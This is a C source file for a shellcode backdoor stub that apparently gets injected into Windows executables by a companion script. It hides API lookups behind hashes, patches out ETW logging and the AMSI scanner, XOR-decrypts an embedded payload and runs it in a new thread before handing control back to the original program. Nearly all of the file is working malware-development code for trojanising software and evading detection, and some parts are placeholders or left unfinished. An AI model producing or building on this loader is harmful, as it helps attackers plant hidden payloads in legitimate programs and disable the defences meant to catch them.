/*
 * PE Backdoor Stub — Position-independent mini-loader
 *
 * Compiled as shellcode (no CRT). Runs inside the backdoored process.
 * 1. Patches ETW + AMSI
 * 2. Decrypts payload (XOR) in memory
 * 3. Executes as thread
 * 4. Jumps to original entry point
 *
 * Build: gcc -c -O2 -fno-stack-protector -fno-ident -nostdlib stub.c
 *        objcopy -O binary -j .text stub.o stub.bin
 *
 * The payload data, key, sizes, and OEP RVA are patched in by pe_backdoor.py
 * via placeholder markers.
 */

#include <windows.h>

/* These are resolved at runtime */
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HMODULE(WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef FARPROC(WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI *fn_LoadLibraryA)(LPCSTR);

/* PEB structures */
typedef struct _UNICODE_STR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STR;

typedef struct _LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
} LDR_ENTRY;

/* djb2 hash */
__attribute__((always_inline))
static inline unsigned int djb2_hash(const char *str) {
    unsigned int hash = 5381;
    while (*str) {
        hash = hash * 33 + (unsigned char)*str++;
    }
    return hash;
}

/* djb2 hash for wide string (lowercase, only low byte) */
__attribute__((always_inline))
static inline unsigned int djb2_hash_w(const WCHAR *str) {
    unsigned int hash = 5381;
    while (*str) {
        unsigned char c = (unsigned char)*str;
        if (c >= 'A' && c <= 'Z') c += 0x20;
        hash = hash * 33 + c;
        str++;
    }
    return hash;
}

/* Find module base by name hash via PEB */
__attribute__((always_inline))
static inline HMODULE find_module(unsigned int name_hash) {
    /* PEB -> Ldr -> InMemoryOrderModuleList */
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        LDR_ENTRY *entry = CONTAINING_RECORD(curr, LDR_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer) {
            if (djb2_hash_w(entry->BaseDllName.Buffer) == name_hash) {
                return (HMODULE)entry->DllBase;
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

/* Find export by hash in a module */
__attribute__((always_inline))
static inline FARPROC find_export(HMODULE base, unsigned int func_hash) {
    BYTE *b = (BYTE*)base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)b;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(b + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)(b +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names = (DWORD*)(b + exp->AddressOfNames);
    WORD  *ords  = (WORD*)(b + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)(b + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char*)(b + names[i]);
        if (djb2_hash(name) == func_hash) {
            return (FARPROC)(b + funcs[ords[i]]);
        }
    }
    return NULL;
}

/*
 * Main stub entry — this is the code that runs when the backdoored PE starts.
 *
 * At the end of the .text section, pe_backdoor.py appends:
 *   - 8 bytes: payload_offset (offset from stub start to encrypted payload)
 *   - 4 bytes: payload_size (original size after decryption / de-interleave)
 *   - 4 bytes: encrypted_size (size of encrypted+interleaved data)
 *   - 6 bytes: XOR key
 *   - 1 byte:  entropy_reduced flag
 *   - 1 byte:  padding
 *   - 8 bytes: OEP RVA
 *   - 8 bytes: magic marker 0xDEADBEEFCAFEBABE
 */

/* We can't use main() — this must be position-independent code called at entry */
void __attribute__((section(".text"), naked)) stub_entry(void);

/* Implementation without naked to allow local vars */
void __attribute__((section(".text"), noinline)) stub_impl(void) {
    /* Find our own base — get image base from PEB */
#ifdef _WIN64
    BYTE *image_base = (BYTE*)((PPEB)__readgsqword(0x60))->Reserved3[1]; /* ImageBaseAddress */
#endif

    /* Find kernel32 */
    /* Hash of "kernel32.dll" = 0x7040EE75 */
    HMODULE k32 = find_module(0x7040EE75);
    if (!k32) goto jump_oep;

    /* Resolve GetProcAddress */
    /* djb2("GetProcAddress") = 0x??? — we use find_export instead */
    fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)find_export(k32, 0xC0D83F97);
    fn_VirtualProtect pVirtualProtect = (fn_VirtualProtect)find_export(k32, 0x5765E8B9);
    fn_CreateThread pCreateThread = (fn_CreateThread)find_export(k32, 0x7F08F451);
    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)find_export(k32, 0xCF31BB1F);
    fn_GetModuleHandleA pGetModuleHandleA = (fn_GetModuleHandleA)find_export(k32, 0x5A153F58);
    fn_LoadLibraryA pLoadLibraryA = (fn_LoadLibraryA)find_export(k32, 0xC8AC8026);

    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread) goto jump_oep;

    /* --- Patch ETW --- */
    if (pGetModuleHandleA && pGetProcAddress) {
        char ntdll_s[] = {'n','t','d','l','l','.','d','l','l',0};
        HMODULE hNtdll = pGetModuleHandleA(ntdll_s);
        if (hNtdll) {
            char etw_s[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
            BYTE *etw = (BYTE*)pGetProcAddress(hNtdll, etw_s);
            if (etw) {
                DWORD old;
                pVirtualProtect(etw, 4, PAGE_EXECUTE_READWRITE, &old);
                /* xor eax, eax; ret */
                etw[0] = 0x33; etw[1] = 0xC0; etw[2] = 0xC3;
                pVirtualProtect(etw, 4, old, &old);
            }
        }
    }

    /* --- Patch AMSI --- */
    if (pLoadLibraryA && pGetProcAddress) {
        char amsi_s[] = {'a','m','s','i','.','d','l','l',0};
        HMODULE hAmsi = pGetModuleHandleA(amsi_s);
        if (hAmsi) {
            char scan_s[] = {'A','m','s','i','S','c','a','n','B','u','f','f','e','r',0};
            BYTE *scan = (BYTE*)pGetProcAddress(hAmsi, scan_s);
            if (scan) {
                DWORD old;
                pVirtualProtect(scan, 8, PAGE_EXECUTE_READWRITE, &old);
                /* mov eax, 0x80070057 (E_INVALIDARG); ret */
                scan[0] = 0xB8; scan[1] = 0x57; scan[2] = 0x00;
                scan[3] = 0x07; scan[4] = 0x80; scan[5] = 0xC3;
                pVirtualProtect(scan, 8, old, &old);
            }
        }
    }

    /* --- Find config block at end of our stub ---
     * pe_backdoor.py patches these values at known offsets from stub start
     * We use a simpler approach: read from fixed addresses patched by the tool
     */

    /* These will be patched by pe_backdoor.py — placeholder values */
    /* Using volatile pointers to prevent optimization */
    volatile BYTE  *payload_ptr;    /* set by backdoor tool */
    volatile DWORD  payload_size;
    volatile DWORD  encrypted_size;
    volatile DWORD  oep_rva;

    /* Read patched values from config block
     * The config block is placed right before the encrypted payload
     * Layout at (image_base + config_rva):
     *   +0x00: payload_rva (8 bytes)
     *   +0x08: payload_size (4 bytes) — decrypted size
     *   +0x0C: encrypted_size (4 bytes)
     *   +0x10: key (6 bytes)
     *   +0x16: entropy_reduced (1 byte)
     *   +0x17: padding (1 byte)
     *   +0x18: oep_rva (4 bytes)
     */

    /* pe_backdoor.py will replace these with actual values via binary patching */
    /* For now, we mark them with a pattern that the tool finds and replaces */

    /* PATCH_PAYLOAD_RVA — 8 bytes */
    DWORD64 p_payload_rva  = 0x4141414141414141ULL;
    DWORD   p_payload_size = 0x42424242;
    DWORD   p_enc_size     = 0x43434343;
    DWORD   p_oep_rva      = 0x44444444;
    BYTE    p_key[6]       = {0x4D, 0x61, 0x6C, 0x44, 0x65, 0x76};  /* "MalDev" */
    BYTE    p_entropy       = 0x45;

    BYTE *enc_data = image_base + p_payload_rva;
    DWORD real_size = p_payload_size;
    DWORD enc_size  = p_enc_size;

    /* Allocate memory */
    BYTE *mem = (BYTE*)pVirtualAlloc(NULL, real_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) goto jump_oep;

    /* De-interleave if entropy reduced, then XOR decrypt */
    if (p_entropy == 1) {
        /* Entropy reduced: every other byte is null, real data at even indices */
        for (DWORD i = 0; i < real_size; i++) {
            mem[i] = enc_data[i * 2];
        }
    } else {
        for (DWORD i = 0; i < enc_size; i++) {
            mem[i] = enc_data[i];
        }
    }

    /* XOR decrypt */
    for (DWORD i = 0; i < real_size; i++) {
        mem[i] ^= p_key[i % 6];
    }

    /* Make executable */
    DWORD old_prot;
    pVirtualProtect(mem, real_size, PAGE_EXECUTE_READ, &old_prot);

    /* Create thread */
    pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

jump_oep:
    ;
    /* Jump to OEP — this part is handled by the assembly wrapper */
}
